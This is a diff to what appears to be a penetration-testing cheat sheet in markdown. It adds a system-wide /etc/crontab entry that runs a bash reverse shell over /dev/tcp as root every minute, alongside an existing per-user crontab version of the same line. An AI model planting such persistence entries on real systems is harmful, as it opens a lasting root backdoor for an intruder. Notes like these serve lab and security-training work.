@@ -310,6 +310,11 @@ If there is a port 53 open on the machine you could do a zone transfer to get in
 ```
 */1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
 ```
+Or you can add in system wide contab (nano /etc/crontab)
+
+```
+*/1 * * * *     root    /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
+```
 ### Change SSH port
 `nano /etc/ssh/sshd_config` (change PORT 22 to any port you want also you can tinker with configuration file)
 `service sshd restart`     (Restart SSH service to apply changes)
